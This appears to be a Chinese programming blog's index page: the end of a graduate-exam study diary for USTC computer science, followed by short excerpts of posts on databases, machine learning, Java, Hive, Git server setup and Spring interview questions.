我好像大概是在8.20号左右做完一遍的，做完之后很慌张，觉得自己太菜了，然后又突然发现了汤老师的强化班，然后赶紧看，建议大家最好在暑假开始的时候就看强化班，因为其实到了暑假的时候基础班的知识基本都忘记了。一直跟着一个老师就好，老师自己都是有体系的。也建议大家不要像我一样开始做张宇后面做李永乐，把一本书吃透比做好几本书有用的多。
看完强化班大概就到9月了，这个时候我开始第二遍复习全书，用别的颜色标记题目，这一遍做的感觉比第一遍好多了，速度也快很多，不懂的题多翻翻强化班笔记。
十月开始做李永乐数一的真题卷，这个时候有些老师会说从90的开始做，有些老师说从00年开始做，建议大家根据自己的情况来，觉得自己数学还可以的话就从90的开始做吧，90—00的卷子题量少，可以一天一套，做完就订正然后做错题，我刚开始做的时候一套卷子也就60来分吧，不用气馁，提升的机会还有很多～做真题的速度我基本是按自己的感觉来的，每天8点开始做，做完订正，订正的时候顺便翻一下全书上同类型的题目，然后做错题并且写下自己错的原因，如果当天可以做错题本就直接做掉，不行的话第二天做，两三套卷子的错题一起放同一天做也可以。
基础差一点的同学建议从00年开始做，可以花两到三天时间把真题吃透，第一天做题，第二天做同类型题，第三天再做一遍外加做错题集。
记得留下近几年的卷子放到最后测试，真题做完一遍后10年以后的可以做第二遍，前几年的只做错题就好了，我在十一月份的时候第一遍的真题分数基本稳定在130上下吧，最难的18年卷子好像120出头一点，有题目不会没有关系，只要会做的题都做对分就不会低。
后期无论如何都要保证3小时来做数学，千万不要因为政治放弃数学，手生会很可怕的。
今年的数学我有两道大题不会，就是基本没做的那种，但是我做出来的题里好像就错了一道填空题吧，所以最后124也还算满意。
2.英语 英语可能是我花费时间比较少的一门，基本复习时间都在晚上，虽然我晚上复习效率都不高。
每天早上背一个小时的单词，前期我背的是红宝书，就是很大一本的那个，我只背了必背的那一部分，感觉自己背的差不多了以后又去背何凯文的1575，我背单词刚开始是一单元一单元的背，后来发现这样效率太低了，背完后面就忘记前面，所以后来就按艾宾浩斯遗忘曲线的表格来背（王江涛老师的考研英语高分写作前几页就有那个表）这个真的很有效，背的很快。
三月份我每天晚上会看一下何凯文的长难句，感觉还是有点用的，建议大家也跟一下他的每日一句，会潜移默化地对长难句有点感觉。
我大概从清明节以后开始做的阅读真题，用的黄皮书，开始做九几年的基础部分，这个只做了一遍，做完之后记录一下生词还有长难句，第二天早上可以拿出来看一下。基础部分做完以后做那个珍藏版（05-14年的），阅读可以一天一篇吧，一定要给自己限时20分钟以内做完，做完之后对答案想想自己为什么错，可以记录下来，统计一下自己犯的哪种错误比较多，以后小心这类错误，然后要逐句翻译，然后对着译文看看自己翻译的对不对。珍藏版我做了两遍，记得标记自己错的题目，以后多看，我是没怎么看过英语阅读的视频的，但是了解过一点，唐迟讲的比较好吧，阅读基本都是找原文，其实也不太需要看视频。最近几年的放到考前做真题训练。
我在九月份开始背英语作文，王江涛老师的考研英语高分写作，只背了07年以后的，每天早上背一篇+复习前面+背阅读单词，刚开始背可能背的比较慢，用艾宾浩斯的表背熟了之后就会好一点了，一定要背到滚花烂熟说出中文背英文的地步，可以把你觉得比较好的句子单拎出来背，背了几篇之后你会发现其实作文都是有套路的，自己挑几句做几类模板，主要分社会现象类、人生哲理类、文化教育类。
九月十月开始就可以把之前卷子的阅读理解和翻译做一下，也不用花太多精力，阅读做好了这些也都会水到渠成的。建议后期精编版的几套都整套的限时做，要留给大小作文最少四十分钟的时间吧，最好保持在阅读总共错六个以内（10年除外），十二月顺便考了个六级，530终于刷分成功，也算是考研加成吧
3.专业课408 跨考生一定要早点准备，一定一定要坚持下去！！
3月开始准备408，每天下午三个半小时，顺序是数据结构，计组，操作系统，计网
刚开始我也一头雾水，课本、王道、天勤都买了，个人感觉天勤比较适合跨考生打基础，里面会有一点作者写的帮助你理解的话，王道更精炼一点，直击考点，我前期看天勤，后期看的王道（数据结构只看了天勤的），如果只看一套问题也不大
第一遍：3—6月
数据结构，课后题请好好做，每一门进度都是20页一天，实在赶不及就拖延一下没关系的，因为之前学过，感觉还算比较轻松，重在理解。
计组第一遍看的我十分崩溃，记得看补码浮点数那一章的时候我每天晚上回去都哭(´;︵;`)，太难受了，感觉自己好垃圾，坚持下来等到第二遍的时候就还好啦，所以一定要坚持住！！
操作系统其实不难，看书的时候觉得还挺有意思的，渐渐沉迷于408无法自拔，发现了计算机的魅力～pv操作的题目可能会有点难，考前多看一下就好了，据我观察奇数年都会考，所以今年特地好好准备了，果然考到了嘿嘿嘿，但是不确定今年考不考～
网络也跟看课外书一样慢慢看就好了，遇到不懂的地方就翻翻课本，课本才是最基础的呀，只是我们为了应试才看的天勤王道。
天勤的题目除了真题外可能有些有点偏，太难的可以选择性放弃，不要气馁，慢慢来坚持下去就好～
第二遍
7月—8月
第二遍看的王道，这时候对知识的理解应该会更深刻，虽然还是难，但至少不会哭唧唧，这一遍一定要注重做题！！尤其是计组的计算题都是有技巧的，一般计组的题目里会给很多信息，我都会摘出来自己简单的写一遍，这样条理会更清晰，关于cache的题目我都会画一下图，比较直观一点。408的真题里有一些是王道知识点里完全没有的，比如有一年的考硬件名称的一道，没有关系，这种题也就一两分，放掉就好。
关于数据结构的算法题，不用追求最优解，暴力解决也有十分可以拿，为了最优解花费太多时间不值得。
第三遍
9月
第二遍看完之后我发现了一个问题，我看了前面忘后面，看了后面忘前面，所以，我又一次拿出了我的艾宾浩斯表，嘿嘿嘿，我把四本书按章节分成了20个部分，对应王江涛的那张表，疯狂得看，每天下午翻三章左右吧，这一遍没有看的很仔细，只要让自己记住知识点就好，要记住课后题里自己犯错的原因，因为分成20个部分每天的任务会很重，所以午睡后的一小时我变成了看408，没看完也没关系，尽量多记就好，这一遍可能是我进步最大的一遍吧
10月10日左右开始做真题，408的真题很少，只有十年的，每一套都要好好对待，我是两天一套，第一天限时做题2：00-5：00三个小时，第二天订正、做错题集、翻看王道，第一遍真题我基本在120-130分左右，因为其中有很多题在王道和天勤里面出现过，基本都有印象，第一遍真题我做了七套吧，然后去做王道和天勤的模拟题，天勤的卷子已经不出版了，要自己打印，我统计了一下408往年真题的情况，我发现近几年的真题里有一些来源于天勤的卷子（因为天勤的模拟卷在15年出了最后一版，但是17和18年的选择题里有其中的题目，不是完全一样，有点像）所以我把天勤模拟卷的错题基本都记住了，结果今年408里真的又有类似的天勤上出过的题�可能是我运气好吧
在模拟卷做完之后又翻了一遍王道，这一遍我把比较生疏的知识点出成填空题做在错题本里，然后开始第二遍，总之真题、王道和天勤的卷子我都做了两遍以上，错题和知识点都记在小本本上，对自己的408还比较胸有成竹，近三年真题基本在120分上下。
今年的408真的比较难，有两道大题题目非常新颖，我认识的几个科班生都只有100多分，因为科大复试线划到了95，所以有些总分370+的都进不了复试，大家一定要重视408的知识本身，打好基础，反复多次，以不变应万变才是王道。
4.政治
政治跟徐涛和肖秀荣，9月开始准备，跟着徐涛的视频看核心考案，等他的刷题班出来以后每天看刷题班，可以不用买他的刷题的书，听课的时候跟着他做题，可以记一下错题，建议在零碎的时间里听刷题班，不费时间。肖秀荣的一千题是一定要买的，核心考案听完之后就开始刷，我总共反反复复刷了三四遍吧，方法也是和做数学一样，每次做都标记错题，第三遍和第四遍的时候只刷错题。然后肖八出来就做肖八选择题，基本在35-45分之间，我是没有背过肖八的主观题的。十月初的时候会出一本风中劲草或者是徐涛的背诵笔记，用哪本都行，这两本书凝炼了政治书里的知识点，这时就不用再去看精讲精练或者核心考案了，只要多读风中劲草或者背诵笔记就好，我在11、12月的时候中午会有1个小时的时间读背政治，晚上睡前也要背，背诵笔记是黑白的，最好自己用彩色水笔标记一下重点，后期反复读重点。
肖四出来以后就开始背肖四，这个时候会有各种各样背主观题的书，大家不要慌，相信肖秀荣就好，他真的很秀，先背肖四，第一轮每天背一套卷子，第二轮每天两套，第三轮每天可以把四套过一遍，一定要反复多次，我是把肖四科目背的，网上有些学长学姐会做整理，直接去下载就好。第四轮完了之后可能还剩一个星期不到吧，我就把徐涛小黄书上肖四里没有的题背了一下，只背徐涛划的重点就好（这部分我没有背完，小黄书题太多了），除此之外我还背了肖秀荣绝密押题班的题，考研资料的微信公众号应该能搞到，他会在除了肖四以外再补充一些可能性相对较小的，有时间的同学可以背一背。
5.复试
中科大的复试真的噩梦，笔试四本书：离散、数据库、编译原理和系统结构，我本科学了前两本，后两本没学，编译原理真的是天书啊，太难了，我又哭唧唧(´;︵;`) 我在准备复试的时候已经做好了调剂软院的打算。过年前我看了一遍离散和数据库，看了一半的编译原理的视频，后来太难了就看不下去了，机试我看了王道机试宝典，敲了一点代码，然后浑浑噩噩外加过年走亲戚到了二月中旬出成绩，我2.22才又开始复习吧，学校图书馆刚开门呀，这时候我超级紧张，因为编译原理什么都不会，之前看的全忘了，后来我在b站上又找了东南大学廖力老师的课，她讲的还挺好的，我只看了前面45讲，因为教材不一样 有几章可以跳过的，这时候我基本会了画NFA、DFA、LL文法、SLR、LALR、LR然后我就不看了，因为往年基本都考这些，语法制导定义看一下，翻译部分直接放弃，类型声明也要会，然后我就买了编译原理的习题指导来做，对着答案做自己总结一下做题套路，结果考试的时候发现题目不难，除了语法制导翻译其他都做出来了。往年的真题也看一下，王道上有，今年的真题我有个认识的大佬同学已经把回忆版发到王道上了，我是基本都忘了ㄟ( ▔, ▔ )ㄏ
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4fcf5b930cbe1725b02592131ff617d6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ca3c91afac9d3066d98dab404cb92cfd/" rel="bookmark">
			linux校正时间
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		见链接：https://blog.csdn.net/anmo1221/article/details/79707531
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/afcfb436b2a6ef86efecf3dd8d0476b2/" rel="bookmark">
			VirtualBox报错：不能为虚拟电脑XXX打开一个新任务  扩展功能包安装方法
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		2019.03.20
早上打开windows主机，virtualbox下面的ubuntu14。想直接在桌面上安装teamviewer_amd64.deb，看能不能安装成功。结果虚拟机打不开，报错。下面的网页有报错截图和解决方法，真实有效。
https://blog.csdn.net/wy_bk/article/details/78926646 《VirtualBox报错：不能为虚拟电脑XXX打开一个新任务》
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b7f5c477b361e9a7a5a0f02494208576/" rel="bookmark">
			游标
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		作者：J-Jian
来源：CSDN
原文：https://blog.csdn.net/Mynewclass/article/details/78735550
版权声明：本文为博主原创文章，转载请附上博文链接！
一、MySQL游标的概念
1、游标介绍
MySQL的游标（cursor）是一个重要的概念，通过查找资料与自己的理解，主要得出以下几点关于自己的理解。
有数据缓冲的思想：游标的设计是一种数据缓冲区的思想，用来存放SQL语句执行的结果。
先有数据基础：游标是在先从数据表中检索出数据之后才能继续灵活操作的技术。
类似于指针：游标类似于指向数据结构堆栈中的指针，用来pop出所指向的数据，并且只能每次取一个。
2、游标优缺点：
（1）游标的优点：
因为游标是针对行操作的，所以对从数据库中select查询得到的每一行可以进行分开的独立的相同或不同的操作，是一种分离的思想。可以满足对某个结果行进行特殊的操作。
游标与基于游标位置的增删改查能力。
MySQL数据库中没有专门描述一行的表达形式，但这是需要的，所以，个人理解的话，我觉得游标是在关系数据库这种面向集合的系统中抽离出来，单独针对行进行表达（也可以理解成网上资料说的：游标是面向集合与面向行的设计思想之间的一种桥梁）
（2）游标缺点
游标的缺点是针对有点而言的，也就是只能一行一行操作，在数据量大的情况下，是不适用的，速度过慢。这里有个比喻就是：当你去ATM存钱是希望一次性存完呢，还是100一张一张的存，这里的100一张一张存就是游标针对行的操作。
数据库大部分是面对集合的，业务会比较复杂，而游标使用会有死锁，影响其他的业务操作，不可取。
当数据量大时，使用游标会造成内存不足现象。
3、游标的使用场景
针对游标的优缺点，我总结游标的使用场景，主要用在循环处理、存储过程、函数中使用，用来查询结果集，就比如：我们需要从表中循环判断并得到想要的结果集，这时候使用游标操作很方便速度也很快。
二、游标的使用
1、游标的使用步骤
游标的使用一般分为5个步骤，主要是：定义游标-&gt;打开游标-&gt;使用游标-&gt;关闭游标-&gt;释放游标。
（1）.定义游标
语法为：
DECLARE &lt;游标名&gt; CURSOR FOR select语句;
1
具体例子：
– 这样游标就对select语句声明了一个游标
DECLARE mycursor CURSOR FOR select * from shops_info;
1
2
（2）.打开游标
打开游标很简单就是下面的语句
open &lt;游标名&gt;
1
（3）.使用游标
使用游标需要用关键字fetch来取出数据，然后取出的数据需要有存放的地方，我们需要用declare声明变量存放列的数据其语法格式为：
declare 变量1 数据类型(与列值的数据类型相同)
declare 变量2 数据类型(与列值的数据类型相同)
declare 变量3 数据类型(与列值的数据类型相同)
FETCH [NEXT | PRIOR | FIRST | LAST] FROM &lt;游标名&gt; [ INTO 变量名1,变量名2,变量名3[,…] ]
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b7f5c477b361e9a7a5a0f02494208576/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5fe9a7fb2767fb71d61e71446ad1a70e/" rel="bookmark">
			数据库主键、外键、索引
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		若一个属性组中能够唯一标识一条记录，该属性组就可以成为一个主键
如有一个学生表（学号，姓名，性别，班级）
里面每一个学号是唯一的，那么学号就一个主键
在课程表中（课程编号，课程号，学分）
里课程编号就是一个主键
成绩表(学号,课程号,成绩)
在成绩表中，单一的一个学号无法标识一条记录，学号和课程号的组合才可以唯一标识一条记录，所以学号和课程号的属性组是一个组件。
成绩表中的学号不是成绩表的主键，但它和学生表中的学号相对应，并且学生表中的学号是学生表的主键，则称成绩表中的学号是学生表的外键 同理 成绩表中的课程号是课程表的外键 1.主键是能确定一条记录的唯一标识，比如，一条记录包括身份正号，姓名，年龄。
身份证号是唯一能确定你这个人的，其他都可能有重复，所以，身份证号是主键。 不能更新主键
2.外键用于与另一张表的关联。是能确定另一张表记录的字段，用于保持数据的一致性。
比如，A表中的一个字段，是B表的主键，那他就可以是A表的外键。
索引是对数据库表中一列或多列的值进行排序的一种结构，使用索引可快速访问数据库表中的特定信息。
主键、外键和索引的区别？
主键
外键
索引
定义：
唯一标识一条记录，不能有重复的，不允许为空
表的外键是另一表的主键, 外键可以有重复的, 可以是空值
该字段没有重复值，但可以有一个空值
作用：
用来保证数据完整性
用来和其他表建立联系用的
是提高查询排序的速度
个数：
主键只能有一个
一个表可以有多个外键
一个表可以有多个惟一索引
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/6b142be1538abf7c9b27eceb24a31693/" rel="bookmark">
			训练集和测试集
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		训练集（Training Set）：帮助我们训练模型，简单的说就是通过训练集的数据让我们确定拟合曲线的参数。，训练集用来估计模型。
验证集（Validation Set）：用来做模型选择（model selection），即做模型的最终优化及确定的，用来辅助我们的模型的构建，可选； 测试集（Test Set）： 为了测试已经训练好的模型的精确度。当然，test set这并不能保证模型的正确性，他只是说相似的数据用此模型会得出相似的结果。因为我们在训练模型的时候，参数全是根据现有训练集里的数据进行修正、拟合，有可能会出现过拟合的情况，即这个参数仅对训练集里的数据拟合比较准确，这个时候再有一个数据需要利用模型预测结果，准确率可能就会很差。
训练集用于监督学习中，监督学习是指利用一组已知类别的样本调整分类器的参数，使其达到所要求性能的过程，也称为监督训练或有教师学习。
实际应用中，一般只将数据集分成两类，即训练集Training set 和测试集Test set，
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fe0bcf0e60f07330796e40ecee428b78/" rel="bookmark">
			在Ubuntu上搭建git服务器
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		在ubuntu上创建git服务器的详细步骤：
1.安装git
Linux作为服务器端系统，Windows作为客户端系统，分别安装Git
服务器端：
[admin@admin ~]$ su root #切换到root用户名 Password: #输入root用户的密码 [root@admin ~]# apt-get install -y git #执行该命令进行Git安装 安装完后，查看Git版本
[root@admin ~]# git --version git version 1.8.3.1 客户端：
下载 Git for Windows，地址：https://git-for-windows.github.io/
安装完之后，可以使用 Git Bash 作为命令行客户端。
安装完之后，查看 Git 版本
$ git --version git version 2.11.0.windows.1 2.linux服务器端创建新用户来管理git仓库
[root@admin ~]# cd /home #进入/home/目录 [root@admin home]# id git #查看git用户是否存在 id: git: no such user #提示git用户不存在 [root@admin home]# useradd git #创建git用户 [root@admin home]# passwd git #为git用户创建密码 Changing password for user git.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fe0bcf0e60f07330796e40ecee428b78/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ff044cc34c9a3507418c6586ba068342/" rel="bookmark">
			java.lang.IllegalArgumentException: Invalid character found in the request target.非法参数异常处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 碰到java.lang.IllegalArgumentException: Invalid character found in the request target. The valid charact异常怎么处理？ 由于MIS配置的是Tomcat 8.5的服务端，导致Web应用不正常，报HTTP 400错误（Chrome无异常、IE报错）。 问题原因初步判断为8.5版本的服务端接收请求不会对符号进行转义，Chrome不异常的原因或许是浏览器自身转义了。 查阅了大量资料后，有两种解决方案： 1. 第一种： 更换低版本的Tomcat来规避这种问题。 2. 第二种： 在conf/catalina.properties中最后添加一行： org.apache.tomcat.util.buf.UDecoder.ALLOW_ENCODED_SLASH=true 重启服务器后，解决问题。 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/78ccd6acf04ea7fcc0a82f8261d066a3/" rel="bookmark">
			对过拟合和欠拟合问题的处理
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		过拟合问题处理 [1]早停策略，参考：Coursera Deep Learning Specialization 02.改善深层神经网络：超参数调试、正则化以及优化 1.第一周 深度学习的实用层面 1.8 其他正则化方法
[2]集成学习策略。用bagging的思路进行正则化，对原始的m个训练样本进行又放回的随机采样，从而可以可以使用有放回的方式构建N组m个样本（里面可以重复）数据集，然后让这N组数据去训练DNN，这样可以DNN往一个样本模式过度拟合，而能学习综合的样本特征，但是这样的方式会导致数据量增加，训练更耗时。
[3]Dropout策略。方法是在前后向传播算法每次迭代时随机隐藏一部分神经元不参与计算，并使用这些隐藏一部分数据后的网络去拟合一批数据，通过这种随机隐藏，来提升拟合限度，防止生成太拟合数据的函数式，但是这样方式需要有大量数据集来喂养，否则会导致欠拟合。
[4]正则化方法
[5]增加数据量
[6]对现有数据进行数据增强
欠拟合问题处理 [1]增加迭代次数，使用更多的数据喂养模型，使得模型有更强的拟合能力。
[2]增加网络的深度和广度，增大神经网络的’容量’，使得模型有更好的空间表示能力。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/a1160ad247b5f9d3eebf1310e8ade174/" rel="bookmark">
			java中统计一个字符串中出现最多的字符和次数
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 用Map来存储被拆分成数组的字符串，key为字符，value为出现次数
package net.hncu.other; import java.io.UnsupportedEncodingException; import java.util.HashMap; import java.util.Map; import java.util.Scanner; import org.junit.Test; public class Demo1 { @Test public void d() throws UnsupportedEncodingException{ Scanner sc=new Scanner(System.in); while(sc.hasNext()){ String str=sc.nextLine().trim(); char[] chs=str.toCharArray(); //把字符串拆分 char key=' '; Integer max=0; Map&lt;String, Integer&gt; map=new HashMap&lt;String, Integer&gt;(); for(int i=0;i&lt;chs.length;i++){ //遍历字符串数组 Integer v=map.get(""+chs[i]); //出现的次数 if(v==null||v==0){ map.put(""+chs[i], 1); } else{ v+=1; map.put(""+chs[i], v); } if(v!=null&amp;&amp;v&gt;max){ max=v; key=chs[i]; //出现最多次数的key } } System.out.println(str+"出现最多的字符是："+key+", 次数是："+max); } } } 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/215e1f943cb2f307cab1249f051455e9/" rel="bookmark">
			Hive中数据的导入与导出
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		最近在做一个小任务，将一个CDH平台中Hive的部分数据同步到另一个平台中。毕竟我也刚开始工作，在正式开始做之前，首先进行了一段时间的练习，下面的内容就是练习时写的文档中的内容。如果哪里有错误或者疏漏，希望各位网友能够指出。
第一篇：HDFS的上传与下载（put &amp; get）：https://www.cnblogs.com/BlackString/p/10552553.html
第三篇：Hive分区表的导入与导出：https://www.cnblogs.com/BlackString/p/10552901.html
第四篇：跨平台传输方案：https://www.cnblogs.com/BlackString/p/10553010.html
Hive数据的上传/导入
1. 前言
​ 上一篇中，我们尝试了向HDFS中上传及下载文件的测试。在本篇，我们尝试从Hive中导出/导入数据。
2. Hive中的数据
Hive中表数据对应着HDFS中的warehouse目录中的文件。其中：
​　一个数据库对应一个.db文件；
​ 一个表对应.db文件中的一个文件夹；
​ 表中的每个分区对应着表文件夹中的一个文件夹；
​ 表中的每个桶对应着每个分区文件夹中的一个文件；
检查Hive，发现Hive中有5个表：
shell
hive&gt; show databases;
db_zh_dw
db_zh_dw2
default
test
test02
查看HDFS中的 /user/hive/warehouse 目录，在其中发现了以下文件：
drwxrwxrwt - admin hive /user/hive/warehouse/db_zh_dw.db
drwxrwxrwt - admin hive /user/hive/warehouse/test.db
drwxrwxrwt - root hive /user/hive/warehouse/test02.db
我们以test数据库为例，查看test中的表及test.db文件中的内容：
hive&gt; show tables;
aos_dic
aos_role
aosparams
————————————————————————————————
[root@DataCenter2 ~]# hadoop fs -ls /user/hive/warehouse/test.db
drwxrwxrwt - hdfs hive /user/hive/warehouse/test.db/aos_dic
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/215e1f943cb2f307cab1249f051455e9/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/8654163a13f28484955cc13936d61a53/" rel="bookmark">
			游戏开发中的数学基础
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		源自《3D游戏编程大师技巧（上册）》的总结
坐标系 表示物体的相对位置信息（相对原点），主要分为以下几种：
2D坐标系： 2D 笛卡尔坐标系。主要运用有序数对来表示点的位置信息2D 极坐标：方向和距离来定义点笛卡尔和极坐标之间的转换。 极坐标 to 笛卡尔 x = rcos(θ) y = rsin(θ) 笛卡尔 to 极坐标 r = sqrt(x^2+y^2) θ = arctan(y/x)=tan^-1(y/x) —— tan的反三角函数 warming:当x=0时，正切为无穷大！！！若x=0，则θ=90 3D坐标系（3D游戏的重点） 3D笛卡尔坐标系 三条轴（有三个相互正交的向量组成）、八个卦限、三个平面（两两组成）依据新增的Z轴方向的不同，分为左手坐标系（LHS）和右手坐标系（RHS）。 DirectX使用左手坐标系，OpenGL使用的是右手坐标系
3D柱面坐标（三维的极坐标） 只是在二维极坐标上加了一个描述高度的变量（Z轴）点的表示：(r,θ,h) 三维笛卡尔和柱面坐标的相互转换 极坐标 to 笛卡尔 x = rcos(θ) y = rsin(θ) z = z; 笛卡尔 to 极坐标 r = sqrt(x^2+y^2) θ = arctan(y/x)=tan^-1(y/x) —— tan的反三角函数 z = z; warming：x=0时与二维转换的类似，不再复述 3D球面坐标。表示点P的坐标为(ρ,Ф,θ),其中： ρ: 点P到原点的距离Ф：原点到点P的线段OP与正Z轴之间的夹角θ：OP在x-y平面上的投影与正x轴之间的夹角 关于球坐标与笛卡尔之间的转换。请自己画图推导加深印象，这里不再给出 小结：关于坐标轴，它可以非常具有创造力。你们可以根据自己的需求，利用数学几何知识进行构建，以达到更好的计算效率。但上述给出的坐标系已经足够大部分情况的使用。 三角学 直角三角形 弧度制：整个圆周为360°，在弧度制中为2Π 。计算机函数sin()和cos()的参数以弧度为单位，而不是以度为单位！
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/8654163a13f28484955cc13936d61a53/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/609c07878d784a19b865fc95f2184059/" rel="bookmark">
			正态分布与截断正态分布
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Normal Distribution 称为正态分布，也称为高斯分布，Truncated Normal Distribution一般翻译为截断正态分布，也有称为截尾正态分布。
截断正态分布是截断分布(Truncated Distribution)的一种，那么截断分布是什么？截断分布是指，限制变量xx 取值范围(scope)的一种分布。例如，限制x取值在0到50之间，即{0&lt;x&lt;50}。因此，根据限制条件的不同，截断分布可以分为：
2.1 限制取值上限，例如，负无穷&lt;x&lt;50
2.2 限制取值下限，例如，0&lt;x&lt;正无穷
2.3 上限下限取值都限制，例如，0&lt;x&lt;50
正态分布则可视为不进行任何截断的截断正态分布，也即自变量的取值为负无穷到正无穷；
---------------------
作者：Inside_Zhang
来源：CSDN
原文：https://blog.csdn.net/lanchunhui/article/details/61623189
版权声明：本文为博主原创文章，转载请附上博文链接！
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/fc88153d4014e7e8659d74fdd25323ba/" rel="bookmark">
			Keras CIFAR-10彩色图像物体识别 卷积神经网络
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		参考书籍《Tensorflow+Keras 深度学习人工智能实践应用》林大贵著
第九章，第十章。
这是一本很通俗易懂的入门实践书，所有代码，事无巨细地进行了解释
CIFAR-10数据集是60000个32x32的彩色图像，分为10类，飞机、汽车、鸟、猫、鹿、狗、青蛙、马、船、卡车。50000个训练图像，10000个测试图像
1.数据集处理
1-1. 下载CIFAR-10数据集
from keras.datasets import cifar10 import numpy as np np.random.seed(10) (x_image_train,y_label_train),\ (x_image_test,y_label_test)=cifar10.load_data() cifar10.load_data()用于下载或者读取CIFAR-10数据集，第一次下载会花费一点时间
1-2. 查看训练数据
1-3.查看多项训练数据（label and image）
import matplotlib.pyplot as plt label_dict={0:'airplane',1:'automobile',2:'bird',3:'cat',4:'deer',5:'dog',6:'frog', 7:'horse',8:'ship',9:'truck'} #用字典dict定义每一个数字所代表的图像类别名称 def plot_images_labels_prediction(images,labels,prediction,idx,num=10): fig=plt.gcf() fig.set_size_inches(12,14) if num&gt;25: num=25 for i in range(0,num): ax=plt.subplot(5,5,1+i) ax.imshow(images[idx],cmap='binary') title=str(i)+','+label_dict[labels[i][0]] if len(prediction)&gt;0: title+='=&gt;'+label_dict[prediction[i]] ax.set_title(title,fontsize=10) ax.set_xticks([]);ax.set_yticks([]) idx+=1 plt.show() plot_images_labels_prediction(x_image_train,y_label_train,[],0)#查看训练数据前十项 1-4.对image,label 数据进行预处理
image 标准化，label转换为独热码（One-Hot Encoding）
数字标准化可以提高模型的准确率，模型精度，提升模型收敛速度。
#image预处理 （RGB各通道除以255标准化） x_image_train_norm=x_image_train.astype('float32')/255.0 x_image_test_norm=x_image_test.astype('float32')/255.0 x_image_train_norm[0][0][0] 查看了训练数据第一个图像第一个点的标准化结果，3个数据分别代表RGB
Out[12]: array([ 0.23137255, 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/fc88153d4014e7e8659d74fdd25323ba/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1d36f51a305043634e7c6b07c91ffc5c/" rel="bookmark">
			SCUT2017软院机试第一题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		题目 输入一个字符串，要求输出能把所有的小写字符放前面，大写字符放中间，数字放后面，并且中间用空格隔开，如果同种类字符间有不同种类的字符，输出后也要用字符隔开
如：
输入：12abc3KF12
输出：abc KF 12 3 12 输入： rwr21r3hello666world
输出 ：rwr r hello world 21 3 666
题目来源：https://blog.csdn.net/Claudia_xuan/article/details/88075759 实现 package cn.hncu.scut2017; import java.util.Scanner; public class SplitString { public static void main(String[] args) { Scanner sc=new Scanner(System.in); while(sc.hasNext()){ String str=sc.nextLine().trim(); String number=str.replaceAll("[a-zA-Z]+", " ").trim(); String lowStr=str.replaceAll("[0-9A-Z]+", " ").trim(); String upStr=str.replaceAll("[0-9a-z]+", " ").trim(); if(lowStr.length()&gt;0){ System.out.print(lowStr+" "); } if(upStr.length()&gt;0){ System.out.print(upStr+" "); } if(number.length()&gt;0){ System.out.println(number); } } } } 果然java对于字符串的处理有着独到的优势啊。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1b57808a34bbc64517288f5eb5d417f6/" rel="bookmark">
			spring  常见面试题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1、什么是spring、为什么要用spring及其优点、spring有哪些模块组成 ?
什么是spring
Spring 是个Java企业级应用的开源开发框架。Spring主要用来开发Java应用，但是有些扩展是针对构建J2EE平台的web应用。Spring 框架目标是简化Java企业级应用开发，它使得开发者只需要关心业务需求。
spring优点
spring属于低侵入式设计，代码的污染极低；spring的DI机制将对象之间的依赖关系交由框架处理，减低组件的耦合性；Spring提供了AOP技术，支持将一些通用任务，如安全、事务、日志、权限等进行集中式管理，从而提供更好的复用。spring对于主流的应用框架提供了集成支持。 spring有哪些模块组成
